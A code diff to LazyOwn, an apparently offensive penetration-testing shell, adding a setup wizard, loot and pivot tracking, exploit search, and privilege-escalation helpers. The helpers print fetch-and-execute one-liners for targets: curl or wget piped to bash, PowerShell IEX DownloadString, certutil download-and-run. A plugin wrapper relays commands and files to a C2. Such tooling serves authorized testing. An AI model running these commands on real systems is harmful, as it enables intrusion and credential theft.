@@ -35,6 +35,26 @@ from cli.graph_advisor import format_neighbors as _format_neighbors
 from cli.graph_advisor import format_search_table as _format_search_table
 from cli.graph_advisor import format_suggestions as _format_suggestions
 from cli.reactive_hints import render_inline_hints as _render_inline_hints
+from cli.wizard import run as _run_wizard
+from cli.protips import print_session_tip as _print_session_tip
+from cli.protips import render_contextual_tip as _render_contextual_tip
+from cli.ops_commands import print_ctx as _print_ctx
+from cli.ops_commands import tgrep as _tgrep
+from cli.ops_commands import print_phase as _print_phase
+from cli.ops_commands import read_phase as _read_phase
+from cli.ops_commands import write_phase as _write_phase
+from cli.ops_commands import PHASES as _PHASES
+from cli.ops_commands import note_add as _note_add
+from cli.ops_commands import note_list as _note_list
+from cli.ops_commands import loot_show as _loot_show
+from cli.ops_commands import pivot_add as _pivot_add
+from cli.ops_commands import pivot_list as _pivot_list
+from cli.ops_commands import tasks_list as _tasks_list
+from cli.ops_commands import tasks_add as _tasks_add
+from cli.ops_commands import tasks_done as _tasks_done
+from cli.ops_commands import tasks_start as _tasks_start
+from cli.ops_commands import scans_list as _scans_list
+from cli.ops_commands import sitrep as _sitrep
 from cli.palette import CommandIndexError as _CommandIndexError
 from cli.palette import load_index as _load_command_index
 from cli.palette_command import PaletteCompleter as _PaletteCompleter
@@ -124,6 +144,13 @@ class LazyOwnShell(cmd2.Cmd):
     activate_virtualenv("env")
 
     config = Config(load_payload())
+
+    _rhost_for_hint = config.rhost
+    if not NOBANNER and not _rhost_for_hint:
+        intro += (
+            f"\n    {YELLOW}[!] rhost is not set — run {GREEN}wizard{YELLOW} for guided setup"
+            f" or {GREEN}assign rhost <IP>{YELLOW} to start.{RESET}\n"
+        )
 
     rhost = config.rhost
     lhost = config.lhost
@@ -391,9 +418,19 @@ class LazyOwnShell(cmd2.Cmd):
             enabled = str(self.params.get("enable_inline_hints", True)).lower() not in ("false", "0", "no")
             if enabled:
                 advisor = _GraphAdvisor.from_path()
+                cmd_str = str(getattr(data, "statement", "") or "")
                 if advisor.is_available():
-                    cmd_str = str(getattr(data, "statement", "") or "")
                     _render_inline_hints(advisor, cmd_str, limit=3, enabled=True)
+                ctx = {
+                    "last_cmd": cmd_str,
+                    "phase": self.params.get("phase") or "",
+                    "os_id": str(self.params.get("os_id") or ""),
+                    "rhost": self.params.get("rhost") or "",
+                    "domain": self.params.get("domain") or "",
+                    "api_key": self.params.get("api_key") or "",
+                    "lhost": self.params.get("lhost") or "",
+                }
+                _render_contextual_tip(cmd_str, ctx)
         except Exception:
             pass
         return data
@@ -668,6 +705,8 @@ class LazyOwnShell(cmd2.Cmd):
                     command_template = tool_data.get("command")
                     triggers = tool_data.get("trigger", [])
                     active = tool_data.get("active", False)
+                    tool_category = tool_data.get("category", pwntomate_category)
+                    tool_description = tool_data.get("description", "")
 
                     if not active or not tool_name or not command_template:
                         continue
@@ -711,17 +750,19 @@ class LazyOwnShell(cmd2.Cmd):
                                 def tool_wrapper(*args, final_cmd=final_command):
                                     self.cmd(final_cmd)
                                 outputdir = cmd_params["outputdir"]
-                                docstring = f"Tool:\n  {tool_name}\n\n"
-                                docstring += f"Example:\n  {final_command}\n\n"
-                                docstring += f"Triggered with:\n  {service.service}\n\n"
-                                docstring += f"protocol:\n  {service.protocol}\n\n"
-                                docstring += f"port:\n  {service.port}\n\n"
-                                docstring += f"ip:\n  {host.address}\n\n"
-                                docstring += f"logs:\n  {outputdir}\n"
+                                docstring = (
+                                    f"{tool_description}\n\n" if tool_description else ""
+                                )
+                                docstring += f"Tool:      {tool_name}\n"
+                                docstring += f"Category:  {tool_category}\n"
+                                docstring += f"Trigger:   {service.service} ({service.protocol}/{service.port})\n"
+                                docstring += f"Target:    {host.address}\n"
+                                docstring += f"Command:   {final_command[:120]}\n"
+                                docstring += f"Logs:      {outputdir}\n"
                                 tool_wrapper.__doc__ = docstring
-
+                                cmd2.utils.categorize(tool_wrapper, tool_category)
                                 setattr(self.__class__, f"do_{tool_name}", tool_wrapper)
-                                print_msg(f"Command '{tool_name}' register {service.service}) from tools")
+                                print_msg(f"Command '{tool_name}' registered [{tool_category}] from tools")
 
                 except Exception as e:
                     print_error(f"[ERROR] Fallo al cargar plugin {tool_file}: {e}")
@@ -805,32 +846,34 @@ class LazyOwnShell(cmd2.Cmd):
                     print_error(f"Error loading YAML plugin '{filename}': {e}")
 
     def register_yaml_plugin(self, plugin_data):
-        """
-        Registers a YAML plugin as a new command.
+        """Register a YAML addon as a shell command.
 
-        This method creates a dynamic command based on the plugin's configuration
-        and assigns it to the application.
+        Reads the optional ``category`` field from the addon YAML (falls back
+        to ``"14. Yaml Addon."`` when absent) and sets the cmd2 category
+        attribute on the wrapper so the command appears in the correct palette
+        section without any hardcoded string in this method.
+
+        Also reads the optional ``tags`` list for future palette filtering, and
+        performs a lightweight dependency check before first execution.
         """
         tool = plugin_data.get('tool', {})
         name = plugin_data['name']
         params = plugin_data.get('params', [])
-        description = plugin_data.get('description', [])
+        description = plugin_data.get('description', '')
+        tags = plugin_data.get('tags', [])
         execute_command = tool.get('execute_command', '')
+        addon_category = plugin_data.get('category', '14. Yaml Addon.')
 
-        @cmd2.with_category("14. Yaml Addon.")
         def wrapper_yaml(arg):
             try:
-
                 args = arg.split()
                 param_values = {}
 
                 for param in params:
                     param_name = param['name']
-
                     if param.get('required', False) and param_name not in self.params:
                         self.display_toastr(f"Error: Parameter '{param_name}' is required but not found in self.params.", type='warning')
                         return
-
                     if param_name in self.params:
                         param_values[param_name] = self.params[param_name]
                     elif 'default' in param:
@@ -846,12 +889,15 @@ class LazyOwnShell(cmd2.Cmd):
                         self.cmd(f"git clone {tool['repo_url']} {install_path}")
                         if 'install_command' in tool:
                             cmdinstall = replace_command_placeholders(tool['install_command'], self.params)
-                            cmd = f"cd {install_path} && {cmdinstall}"
-                            self.cmd(cmd)
+                            self.cmd(f"cd {install_path} && {cmdinstall}")
                             self.cmd("sleep 2")
 
-
                     if 'execute_command' in tool:
+                        binary = execute_command.split()[0] if execute_command else ''
+                        if binary and not os.path.isabs(binary) and not is_binary_present(binary):
+                            install_hint = tool.get('install_command', f"git clone {tool.get('repo_url','')}")
+                            print_warn(f"'{binary}' not found in PATH.")
+                            print_warn(f"Install: {install_hint[:120]}")
                         command = execute_command.format(**param_values)
                         command_replaced = replace_command_placeholders(command, self.params)
                         if args:
@@ -861,54 +907,45 @@ class LazyOwnShell(cmd2.Cmd):
                         self.cmd(final_command)
 
                     if 'upload_file' in tool:
-                        upload_files = tool['upload_file']
-                        file_list = [f.strip() for f in upload_files.split(',')]
-                        
-                        for file_path in file_list:
+                        for file_path in [f.strip() for f in tool['upload_file'].split(',')]:
                             if file_path:
-                                cmd_remotecmd = f"upload_c2 {file_path}"
-                                self.display_toastr(f"Remote Upload executing: {cmd_remotecmd}", type='info')
-                                self.onecmd(cmd_remotecmd)
+                                self.display_toastr(f"Remote Upload executing: upload_c2 {file_path}", type='info')
+                                self.onecmd(f"upload_c2 {file_path}")
                                 self.cmd("sleep 10")
 
                     if 'remote_command' in tool:
                         remotecmd = replace_command_placeholders(tool['remote_command'], self.params)
-                        cmd_remotecmd = f"issue_command_to_c2 {remotecmd}"
                         self.display_toastr(f"Remote command executing: {remotecmd}", type='info')
-                        self.onecmd(cmd_remotecmd)
+                        self.onecmd(f"issue_command_to_c2 {remotecmd}")
 
                     if 'download_file' in tool:
-                        download_files = tool['download_file']
-                        
-                        file_list = [f.strip() for f in download_files.split(',')]
-                        
-                        for file_path in file_list:
-                            if file_path: 
-                                cmd_downloadcmd = f"download_c2 {file_path}"
-                                self.display_toastr(f"Remote Upload executing: {cmd_downloadcmd}", type='info')
-                                self.onecmd(cmd_downloadcmd)
+                        for file_path in [f.strip() for f in tool['download_file'].split(',')]:
+                            if file_path:
+                                self.display_toastr(f"Remote Download executing: download_c2 {file_path}", type='info')
+                                self.onecmd(f"download_c2 {file_path}")
 
                     if 'lazycommand' in tool:
                         lazycommand = replace_command_placeholders(tool['lazycommand'], self.params)
                         self.display_toastr(f"Lazy Command executing: {lazycommand}", type='info')
-                        
-                        commands = [cmd.strip() for cmd in lazycommand.split(',')]
-                        for cmd in commands:
-                            if cmd:
-                                self.onecmd(cmd)
+                        for lazy_cmd in [c.strip() for c in lazycommand.split(',')]:
+                            if lazy_cmd:
+                                self.onecmd(lazy_cmd)
 
                 except KeyError as e:
                     self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
                     return
 
-
             except Exception as e:
                 self.display_toastr(f"Error in plugin '{name}': {e}", type='error')
                 return
 
-        wrapper_yaml.__doc__  = description
+        wrapper_yaml.__doc__ = (
+            f"{description}\n\nCategory: {addon_category}"
+            + (f"\nTags: {', '.join(tags)}" if tags else "")
+        )
+        cmd2.utils.categorize(wrapper_yaml, addon_category)
         setattr(self, f'do_{name}', wrapper_yaml)
-        print_msg(f"Command '{name}' registered from YAML.")
+        print_msg(f"Command '{name}' registered [{addon_category}] from YAML.")
 
     def register_all_adversary_commands(self):
         for file in glob.glob("lazyadversaries/*.yaml"):
@@ -1084,6 +1121,23 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception:
             return []
 
+    def preloop(self):
+        """Print a session-start pro tip after the banner, once per session."""
+        try:
+            enabled = str(self.params.get("enable_inline_hints", True)).lower() not in ("false", "0", "no")
+            if enabled:
+                ctx = {
+                    "phase": self.params.get("phase") or "",
+                    "os_id": str(self.params.get("os_id") or ""),
+                    "rhost": self.params.get("rhost") or "",
+                    "domain": self.params.get("domain") or "",
+                    "api_key": self.params.get("api_key") or "",
+                    "lhost": self.params.get("lhost") or "",
+                }
+                _print_session_tip(ctx)
+        except Exception:
+            pass
+
     def postloop(self):
         """
         Handle operations to perform after exiting the command loop.
@@ -1109,6 +1163,236 @@ class LazyOwnShell(cmd2.Cmd):
             GoodBye LazyOwner
         """
         print_warn("GoodBye LazyOwner")
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_wizard(self, line):
+        """Guided first-run setup wizard — configure rhost, lhost, domain, wordlists and more.
+
+        Walks the operator through the seven essential configuration values with
+        auto-detection (lhost from routing table, wordlist paths from SecLists),
+        live ping validation for rhost, and a readiness summary at the end.
+
+        Usage:
+            ``wizard``         — start interactive setup
+            ``wizard --check`` — show readiness summary only, no prompts
+
+        Both novice and experienced operators can use this:
+        - Novices: step-by-step prompts with clear descriptions.
+        - Experts: press Enter to accept auto-detected values; Ctrl-C to abort.
+        """
+        check_only = (line or "").strip() == "--check"
+
+        def _save(key, value):
+            _apply_assign(self.params, key, value, save=_save_payload)
+            try:
+                self.aliases.update(_load_aliases(self.params))
+            except Exception:
+                pass
+
+        if check_only:
+            from cli.wizard import _build_readiness, _print_readiness
+            items = _build_readiness(self.params)
+            _print_readiness(items)
+            return
+
+        _run_wizard(self.params, save=_save)
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_ctx(self, line):
+        """Print a single-line operator context: rhost, lhost, domain, phase, os, creds.
+
+        No arguments. Reads payload.json and sessions/world_model.json. Fast —
+        suitable to run between every command for situational awareness.
+
+        Usage:
+            ``ctx``
+        """
+        _print_ctx(self.params)
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_tgrep(self, line):
+        """Search across all previous command outputs and session logs.
+
+        Searches in: sessions/_cli_transcript.jsonl (full outputs),
+        sessions/LazyOwn_session_report.csv (command list), and
+        sessions/logs/*.txt (tool output files). Useful for recalling
+        credentials, open ports, or any string from earlier in the session.
+
+        Usage:
+            ``tgrep <pattern>``
+            ``tgrep password``
+            ``tgrep '10\\.10\\.11'``
+            ``tgrep Administrator``
+        """
+        _tgrep((line or "").strip())
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_phase(self, line):
+        """Get or set the current kill-chain phase.
+
+        When called without arguments, shows the current phase and the
+        full kill-chain progress bar. When called with a phase name,
+        updates sessions/world_model.json — the dashboard reflects the
+        change on its next refresh (within 5 s).
+
+        Valid phases: recon scan enum exploit privesc lateral exfil report
+
+        Usage:
+            ``phase``               — show current phase and progress bar
+            ``phase exploit``       — move to exploit phase
+            ``phase privesc``       — advance to privilege escalation
+
+        The phase drives the inline hints and the kill-chain panel in the
+        operator dashboard. Advancing a phase also marks the previous one
+        as completed in the dashboard progress bar.
+        """
+        arg = (line or "").strip().lower()
+        if not arg:
+            _print_phase()
+            return
+        if arg not in _PHASES:
+            valid = ", ".join(_PHASES)
+            print_error(f"Unknown phase: {arg!r}  valid phases: {valid}")
+            return
+        ok = _write_phase(arg)
+        if ok:
+            print_msg(f"Phase set to {arg.upper()}  — dashboard will update within 5 s")
+        else:
+            print_error(f"Failed to write phase to sessions/world_model.json")
+
+    def complete_phase(self, text, line, begidx, endidx):
+        """Tab-complete phase names."""
+        return [p for p in _PHASES if p.startswith(text)]
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_note(self, line):
+        """Capture a quick operator note attached to the current target and phase.
+
+        Notes land in sessions/notes.jsonl with timestamp, rhost, and phase
+        so they survive session restarts and show up in reports.
+
+        Usage:
+            ``note``                    — list recent notes for current rhost
+            ``note <text>``             — save a note for current rhost/phase
+            ``note -a``                 — list all notes (all targets)
+            ``note Found admin creds in /etc/shadow``
+            ``note SMB signing disabled on DC01``
+        """
+        arg = (line or "").strip()
+        if not arg or arg == "-a":
+            rhost = "" if arg == "-a" else (self.params.get("rhost") or "")
+            _note_list(rhost=rhost)
+        else:
+            _note_add(
+                text=arg,
+                rhost=self.params.get("rhost") or "",
+                phase=_read_phase(),
+            )
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_l00t(self, line):
+        """Show a unified table of all captured credentials and hashes.
+
+        Reads every credentials*.txt and hash*.txt in sessions/ and displays
+        them in a single deduplicated table. Duplicates across files are shown
+        dimmed. Cleartext passwords in green, hashes in red.
+
+        Usage:
+            ``l00t``
+        """
+        _loot_show()
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_pivot(self, line):
+        """Record a newly discovered pivot target or show the pivot chain.
+
+        When you compromise a host and discover a new reachable network/IP,
+        record it here. The pivot chain is stored in sessions/pivots.jsonl
+        and survives session restarts.
+
+        Usage:
+            ``pivot``                        — show full pivot chain
+            ``pivot <new-ip>``               — record pivot via current rhost
+            ``pivot <new-ip> <note>``        — record with a free-form note
+            ``pivot 10.10.10.50``
+            ``pivot 10.10.10.50 SMB open, admin share accessible``
+        """
+        arg = (line or "").strip()
+        if not arg:
+            _pivot_list()
+            return
+        parts = arg.split(None, 1)
+        new_ip = parts[0]
+        note = parts[1] if len(parts) > 1 else ""
+        via = self.params.get("rhost") or ""
+        _pivot_add(new_ip=new_ip, via_ip=via, note=note)
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_tasks(self, line):
+        """View and manage the task queue from sessions/tasks.json.
+
+        Tasks are created automatically by world_model_watcher and the
+        autonomous daemon, and can also be added manually. Each task has
+        an id, title, status (New/Started/Done/Blocked), and operator.
+
+        Usage:
+            ``tasks``             — show active tasks (New + Started)
+            ``tasks --all``       — show all tasks including Done
+            ``tasks add <text>``  — create a new task
+            ``tasks done <id>``   — mark task as Done
+            ``tasks start <id>``  — mark task as Started
+        """
+        arg = (line or "").strip()
+        if not arg or arg == "--all":
+            _tasks_list(status_filter="all" if arg == "--all" else "active")
+        elif arg.startswith("add "):
+            _tasks_add(arg[4:].strip())
+        elif arg.startswith("done "):
+            try:
+                _tasks_done(int(arg[5:].strip()))
+            except ValueError:
+                print_error("Usage: tasks done <integer-id>")
+        elif arg.startswith("start "):
+            try:
+                _tasks_start(int(arg[6:].strip()))
+            except ValueError:
+                print_error("Usage: tasks start <integer-id>")
+        else:
+            print_error("Usage: tasks [--all | add <text> | done <id> | start <id>]")
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_scans(self, line):
+        """List nmap scan files in sessions/ with age, size, and open ports.
+
+        Without arguments shows all scan files. With an IP filters to scans
+        for that target only.
+
+        Usage:
+            ``scans``              — all scan files
+            ``scans 10.10.11.5``   — scans for that host only
+            ``scans rhost``        — shortcut for current rhost
+        """
+        arg = (line or "").strip()
+        if arg == "rhost":
+            arg = self.params.get("rhost") or ""
+        _scans_list(rhost=arg)
+
+    @cmd2.with_category(miscellaneous_category)
+    def do_sitrep(self, line):
+        """Print a unified operational situation report.
+
+        Aggregates in one view: target/attacker/domain, current phase and OS,
+        nmap scans found for the active target, captured credentials and
+        hashes, tasks backlog (New/Started/Done), operator notes, pivot chain,
+        and world model host/vuln/cred counts.
+
+        Run this at the start of a shift, after pivoting to a new target, or
+        whenever you need a quick 'where are we?' during the engagement.
+
+        Usage:
+            ``sitrep``
+        """
+        _sitrep(self.params)
 
     @cmd2.with_category(miscellaneous_category)
     def do_assign(self, line):
@@ -4295,41 +4579,111 @@ class LazyOwnShell(cmd2.Cmd):
 
     @cmd2.with_category(exploitation_category)
     def do_ss(self, line):
+        """Search all exploit sources and map findings to the next LazyOwn command.
+
+        Without arguments: reads the nmap XML for the current rhost, extracts
+        every open service+version, searches all sources for each one, saves
+        structured results to sessions/ss_results_<rhost>.json, creates tasks
+        for services with hits, and prints a 'what to try next' table.
+
+        With a manual query: runs the full multi-source search (searchsploit,
+        NVD, ExploitAlert, PacketStorm, MSF, Sploitus) for that term and shows
+        recommended commands for the matching service.
+
+        Usage:
+            ``ss``                  — auto-scan from nmap XML for current rhost
+            ``ss apache 2.4.49``    — manual query
+            ``ss OpenSSH 8.4``      — manual query
         """
-        Uses `searchsploit` to search for exploits in the Exploit Database based on the provided search term.
+        from cli.exploit_advisor import (
+            ExploitHit, ServiceInfo, ServiceResult,
+            find_nmap_xml, inject_exploit_tasks,
+            parse_nmap_xml, print_exploit_summary, save_ss_results,
+        )
 
-        :param line: The search term or query to find relevant exploits. This must be provided as an argument.
+        rhost = self.params.get("rhost") or ""
 
-        :returns: None
+        def _run_single_search(query: str) -> list[ExploitHit]:
+            hits: list[ExploitHit] = []
+            import subprocess as _sp
+            try:
+                out = _sp.run(
+                    ["searchsploit", "--disable-colour", query],
+                    capture_output=True, text=True, timeout=15,
+                )
+                for ln in (out.stdout or "").splitlines():
+                    ln = ln.strip()
+                    if ln and not ln.startswith("-") and "|" in ln:
+                        parts = ln.split("|")
+                        title = parts[0].strip()
+                        ref   = parts[1].strip() if len(parts) > 1 else ""
+                        if title and title.lower() not in ("exploits", "shellcodes", "papers", "title"):
+                            hits.append(ExploitHit(source="searchsploit", title=title, ref=ref))
+            except Exception:
+                pass
+            return hits
 
-        Manual execution:
-        To manually search for exploits using `searchsploit`, use the following command:
-            searchsploit <search_term>
+        # ── Auto mode: read nmap XML ──────────────────────────────────────
+        if not line.strip():
+            if not check_rhost(rhost):
+                return
+            xml_files = find_nmap_xml(rhost)
+            if not xml_files:
+                print_warn(f"No nmap XML found for {rhost}. Run lazynmap first.")
+                print_msg(f"Or use: ss <service> <version>")
+                return
+            xml_path = xml_files[0]
+            services = parse_nmap_xml(xml_path)
+            if not services:
+                print_warn(f"No open services found in {xml_path}")
+                return
+            print_msg(f"Found {len(services)} open service(s) in {os.path.basename(xml_path)}")
+            results: list[ServiceResult] = []
+            for svc in services:
+                query = svc.search_query
+                if not query:
+                    results.append(ServiceResult(service=svc))
+                    continue
+                print_msg(f"  [{svc.port}/{svc.name}] searching: {query}")
+                hits = _run_single_search(query)
+                result = ServiceResult(service=svc, hits=hits)
+                results.append(result)
+            saved = save_ss_results(results, rhost)
+            n_tasks = inject_exploit_tasks(results, rhost)
+            print_exploit_summary(results, rhost)
+            print_msg(f"Results saved to {saved}")
+            if n_tasks:
+                print_msg(f"{n_tasks} task(s) added — run 'tasks' to view")
+            return
 
-        Replace `<search_term>` with the term or keyword you want to search for. For example:
-            searchsploit kernel
-        """
-
-        print_msg(f"Searching in searchsploit{RESET}")
-        self.cmd(f"searchsploit {line}")
-
-
-        getnvd = find_ss(line)
+        # ── Manual mode: existing multi-source search + next-step table ───
+        query = line.strip()
+        print_msg(f"Searching in searchsploit")
+        self.cmd(f"searchsploit {query}")
+        getnvd = find_ss(query)
         nvddb(getnvd)
-        getnvd = find_ea(line)
+        getnvd = find_ea(query)
         exploitalert(getnvd)
-        getnvd = find_ps(line)
+        getnvd = find_ps(query)
         packetstormsecurity(getnvd)
-        self.cmd(f"msfconsole -q -x \"search {line}; exit\"")
-        line = line.replace(" ","+")
+        self.cmd(f"msfconsole -q -x \"search {query}; exit\"")
+        q_url = query.replace(" ", "+")
         if not is_binary_present("pompem"):
             self.display_toastr("Not Found pompem, installing", type="warning")
             self.cmd("sudo apt install pompem -y")
-        self.cmd(f"cd sessions && pompem -s {line} --txt")
-        self.onecmd(f"creds_py '{line}'")
-        print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://sploitus.com/?query={line}#exploits")
-        print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://exploits.shodan.io/?q={line}")
-        return
+        self.cmd(f"cd sessions && pompem -s {q_url} --txt")
+        self.onecmd(f"creds_py '{query}'")
+        print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://sploitus.com/?query={q_url}#exploits")
+        print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://exploits.shodan.io/?q={q_url}")
+        # infer service from query first token and show next-step table
+        svc_name = query.split()[0].lower()
+        dummy_svc = ServiceInfo(port=0, protocol="tcp", name=svc_name, product=query, version="")
+        dummy_hits = _run_single_search(query)
+        dummy_result = ServiceResult(service=dummy_svc, hits=dummy_hits)
+        print_exploit_summary([dummy_result], rhost)
+        if rhost and dummy_hits:
+            inject_exploit_tasks([dummy_result], rhost)
+            print_msg("Task created in tasks.json — run 'tasks' to view")
 
     @cmd2.with_category(scanning_category)
     def do_wfuzz(self, line):
@@ -19069,7 +19423,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Password variations saved to: {output_file}")
 
-    @cmd2.with_category(credential_access_category)
+    @cmd2.with_category(privilege_escalation_category)
     def do_sudo(self, line):
         """
         Checks if the script is running with superuser (sudo) privileges, and if not,
@@ -19082,6 +19436,301 @@ class LazyOwnShell(cmd2.Cmd):
         :return: None
         """
         check_sudo()
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_linpeas(self, line):
+        """Serve linpeas.sh via HTTP and print the one-liner to run on the target.
+
+        Looks for linpeas.sh in /usr/share/peass/linpeas/ and the external/
+        directory. Starts a background HTTP server on lhost:lport, then prints
+        the exact curl/wget command to paste on the compromised host.
+
+        Usage:
+            ``linpeas``          — serve linpeas.sh (full)
+            ``linpeas small``    — serve linpeas_small.sh
+        """
+        lhost = self.params.get("lhost") or ""
+        lport = self.params.get("lport", 1337)
+        if not check_lhost(lhost):
+            return
+        small = "small" in (line or "").lower()
+        fname = "linpeas_small.sh" if small else "linpeas.sh"
+        candidates = [
+            f"/usr/share/peass/linpeas/{fname}",
+            f"external/.exploit/privilege-escalation-awesome-scripts-suite/linPEAS/{fname}",
+            f"external/{fname}",
+        ]
+        src = next((p for p in candidates if os.path.isfile(p)), None)
+        if not src:
+            print_error(f"{fname} not found. Install with: sudo apt install peass")
+            return
+        sessions_path = f"{self.path}/sessions"
+        dst = f"{sessions_path}/{fname}"
+        if not os.path.exists(dst):
+            os.makedirs(sessions_path, exist_ok=True)
+            import shutil
+            shutil.copy2(src, dst)
+        print_msg(f"Serving {fname} from sessions/ on http://{lhost}:{lport}")
+        print_msg(f"Run on target (Linux):")
+        print_msg(f"  curl -s http://{lhost}:{lport}/{fname} | bash")
+        print_msg(f"  wget -qO- http://{lhost}:{lport}/{fname} | bash")
+        self.cmd(f"python3 -m http.server {lport} --directory {sessions_path} &")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_winpeas(self, line):
+        """Serve winPEAS via HTTP and print the one-liner to run on the target.
+
+        Looks for winPEAS executables in /usr/share/peass/winpeas/. Starts
+        a background HTTP server on lhost:lport so the target can download
+        and run the binary.
+
+        Usage:
+            ``winpeas``          — serve winPEASx64.exe
+            ``winpeas x86``      — serve winPEASx86.exe
+            ``winpeas bat``      — serve winPEAS.bat (no AV evasion)
+            ``winpeas ps1``      — serve winPEAS.ps1
+        """
+        lhost = self.params.get("lhost") or ""
+        lport = self.params.get("lport", 1337)
+        if not check_lhost(lhost):
+            return
+        arg = (line or "").lower().strip()
+        fname_map = {
+            "x86": "winPEASx86.exe",
+            "bat": "winPEAS.bat",
+            "ps1": "winPEAS.ps1",
+            "any": "winPEASany.exe",
+        }
+        fname = fname_map.get(arg, "winPEASx64.exe")
+        src = f"/usr/share/peass/winpeas/{fname}"
+        if not os.path.isfile(src):
+            print_error(f"{fname} not found at {src}. Install: sudo apt install peass")
+            return
+        sessions_path = f"{self.path}/sessions"
+        dst = f"{sessions_path}/{fname}"
+        if not os.path.exists(dst):
+            import shutil
+            shutil.copy2(src, dst)
+        print_msg(f"Serving {fname} via http://{lhost}:{lport}")
+        if fname.endswith(".ps1") or fname.endswith(".bat"):
+            print_msg("Run on target (PowerShell):")
+            print_msg(f'  IEX(New-Object Net.WebClient).DownloadString("http://{lhost}:{lport}/{fname}")')
+        else:
+            print_msg("Run on target (PowerShell):")
+            print_msg(f'  certutil -urlcache -split -f "http://{lhost}:{lport}/{fname}" %TEMP%\\wp.exe && %TEMP%\\wp.exe')
+        self.cmd(f"python3 -m http.server {lport} --directory {sessions_path} &")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_les(self, line):
+        """Run Linux Exploit Suggester against the current target's kernel info.
+
+        Reads the kernel version from sessions/os.json or prompts for it,
+        then runs les.sh locally to suggest kernel exploits.
+
+        Usage:
+            ``les``                   — auto-read kernel from sessions/os.json
+            ``les 5.15.0-91-generic`` — specify kernel version manually
+        """
+        import json as _json
+        kernel = (line or "").strip()
+        if not kernel:
+            os_data = {}
+            os_json = f"{self.path}/sessions/os.json"
+            if os.path.isfile(os_json):
+                try:
+                    with open(os_json) as fh:
+                        os_data = _json.load(fh)
+                except Exception:
+                    pass
+            kernel = os_data.get("kernel") or os_data.get("uname") or ""
+        if not kernel:
+            print_warn("Kernel version unknown. Run 'uname -r' on the target and pass it: les <kernel>")
+            return
+        les_paths = [
+            "external/.exploit/linux-exploit-suggester/linux-exploit-suggester.sh",
+            "/usr/share/les/linux-exploit-suggester.sh",
+        ]
+        les = next((p for p in les_paths if os.path.isfile(p)), None)
+        if not les:
+            print_error("linux-exploit-suggester not found.")
+            print_msg("Install: git clone https://github.com/mzet-/linux-exploit-suggester external/.exploit/linux-exploit-suggester")
+            return
+        print_msg(f"Running linux-exploit-suggester for kernel: {kernel}")
+        self.cmd(f"bash {les} --uname '{kernel}'")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_suid_check(self, line):
+        """Print SUID/SGID enumeration commands for the current target OS.
+
+        Outputs ready-to-paste shell one-liners for finding SUID binaries.
+        After running them on the target, use 'gtfo <binary>' to look up
+        GTFOBins for each result.
+
+        Usage:
+            ``suid_check``
+        """
+        print_msg("Paste on target to find SUID/SGID binaries:")
+        print_msg("  find / -perm -4000 -type f 2>/dev/null")
+        print_msg("  find / -perm -2000 -type f 2>/dev/null")
+        print_msg("  find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null")
+        print_msg("")
+        print_msg("Then look up each result: gtfo <binary>")
+        print_msg("Or run linpeas for automated enumeration: linpeas")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_pspy(self, line):
+        """Serve pspy (process spy without root) via HTTP for the target to download.
+
+        pspy monitors processes without requiring root. Useful for catching
+        cron jobs, scripts run by root, and credential leaks in process args.
+
+        Usage:
+            ``pspy``       — serve pspy64 (default)
+            ``pspy 32``    — serve pspy32
+        """
+        lhost = self.params.get("lhost") or ""
+        lport = self.params.get("lport", 1337)
+        if not check_lhost(lhost):
+            return
+        arch = "32" if "32" in (line or "") else "64"
+        fname = f"pspy{arch}"
+        pspy_paths = [
+            f"external/.exploit/pspy/{fname}",
+            f"/usr/local/bin/{fname}",
+            f"/opt/{fname}",
+        ]
+        src = next((p for p in pspy_paths if os.path.isfile(p)), None)
+        if not src:
+            print_error(f"{fname} not found.")
+            print_msg(f"Download from: https://github.com/DominicBreuker/pspy/releases")
+            print_msg(f"Then place at: external/.exploit/pspy/{fname}")
+            return
+        sessions_path = f"{self.path}/sessions"
+        dst = f"{sessions_path}/{fname}"
+        if not os.path.exists(dst):
+            import shutil
+            shutil.copy2(src, dst)
+            os.chmod(dst, 0o755)
+        print_msg(f"Serving {fname} via http://{lhost}:{lport}")
+        print_msg("Run on target:")
+        print_msg(f"  wget http://{lhost}:{lport}/{fname} -O /tmp/{fname} && chmod +x /tmp/{fname} && /tmp/{fname}")
+        self.cmd(f"python3 -m http.server {lport} --directory {sessions_path} &")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_gtfo(self, line):
+        """Look up a binary in GTFOBins / LOLBas and show exploitation techniques.
+
+        Uses the local parquet knowledge bases (parquets/detalles.parquet for
+        GTFOBins, parquets/lolbas_details.parquet for LOLBas) so results are
+        instant and work offline.
+
+        Usage:
+            ``gtfo sudo``
+            ``gtfo find``
+            ``gtfo python3``
+            ``gtfo certutil``     (LOLBas — Windows)
+        """
+        binary = (line or "").strip().lower()
+        if not binary:
+            print_error("Usage: gtfo <binary>  e.g. gtfo sudo")
+            return
+        found = False
+        gtfo_parquet = f"{self.path}/parquets/detalles.parquet"
+        lolbas_parquet = f"{self.path}/parquets/lolbas_details.parquet"
+        try:
+            import pandas as pd
+            if os.path.isfile(gtfo_parquet):
+                df = pd.read_parquet(gtfo_parquet)
+                mask = df["Binary"].str.lower() == binary
+                hits = df[mask]
+                if not hits.empty:
+                    found = True
+                    print_msg(f"GTFOBins — {binary}")
+                    for _, row in hits.iterrows():
+                        print_msg(f"  [{row.get('Function Name','')}] {row.get('Description','')[:80]}")
